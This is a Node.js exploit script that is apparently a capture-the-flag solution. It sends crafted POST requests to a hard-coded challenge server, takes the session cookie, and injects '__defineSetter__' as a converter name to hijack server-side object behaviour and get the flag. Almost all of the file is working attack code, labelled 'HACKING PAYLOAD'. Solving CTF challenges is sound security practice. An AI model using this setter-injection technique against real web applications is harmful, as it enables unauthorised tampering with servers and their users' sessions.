const fetch = require('node-fetch');

// const url = "http://localhost:59101/";
const url = "http://35.221.81.216:59101/";
// const cookie = "sessionId=WVdu9q7Py8dOB4zOwwfb59nikV6lb2Nh.chQV8hqnQoz4DyvGSuxszgZT4HVoK9YhVZ%2BoCFQAeYI";
// const converter = "flag_POQOXl6ze1dJQiPPmryNabfuP2KHrxRC";
var converter = "base64";
// const converter = "__defineSetter__";
var input = "FLAG_WXKN0NiOe_94vN2Qwna5gHL7qRcOK6rf";
// const input = "FLAG_WVdu9q7Py8dOB4zOwwfb59nikV6lb2Nh";


(async () => {
    // console.log('=============> FIRST REQUEST');

    var response = await fetch(url, {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "pragma": "no-cache",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            // "cookie": cookie
        },
        "referrer": "http://localhost:59101/",
        "referrerPolicy": "no-referrer-when-downgrade",
        "body": `input=${input}&converter=${converter}`,
        // "body": JSON.stringify( {input: "Neptunian will hack this chall", converter: "base64"}),
        "method": "POST",
        "mode": "cors"
    });

	var body = await response.text();

    var cookie = response.headers.get('set-cookie').split(';')[0];

    // No need - used for debugging
    // console.log(cookie);
    // console.log(response.status);
    // console.log(body);

    // console.log('=============> HACKING PAYLOAD - START');

    converter = "__defineSetter__";
    const session_id = cookie.split("=")[1].split(".")[0];
    input = `FLAG_${session_id}`;

    console.log(`Flag param is ${input}`);

    try {

        response = fetch(url, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "pragma": "no-cache",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": cookie
            },
            "referrer": "http://localhost:59101/",
            "referrerPolicy": "no-referrer-when-downgrade",
            "body": `input=${input}&converter=${converter}`,
            // "body": JSON.stringify( {input: "Neptunian will hack this chall", converter: "base64"}),
            "method": "POST",
            "mode": "cors"

        }).then( async (resp) => 
            {

                // console.log('=============> HACKING PAYLOAD - RESPONSE');

                var bd = await resp.text();
                var ck = resp.headers.get('set-cookie').split(';')[0];

                console.log(ck);
                console.log(resp.status);
                console.log(bd);

            }

        );

    } catch(e) {
        console.log('Timeout on hacking');
    }

    setTimeout(async () => {
        // console.log('=============> FINAL BLOW');

        converter = "base65";

        response = await fetch(url, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "pragma": "no-cache",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": cookie
            },
            "referrer": "http://localhost:59101/",
            "referrerPolicy": "no-referrer-when-downgrade",
            "body": `input=${input}&converter=${converter}`,
            // "body": JSON.stringify( {input: "Neptunian will hack this chall", converter: "base64"}),
            "method": "POST",
            "mode": "cors"
        });

        body = await response.text();
        cookie = response.headers.get('set-cookie').split(';')[0];

        // No need - used for debugging
        // console.log(cookie);
        // console.log(response.status);
        // console.log(body);
    }, 3000);


})();

// console.log(response.status);
// console.log(response.text);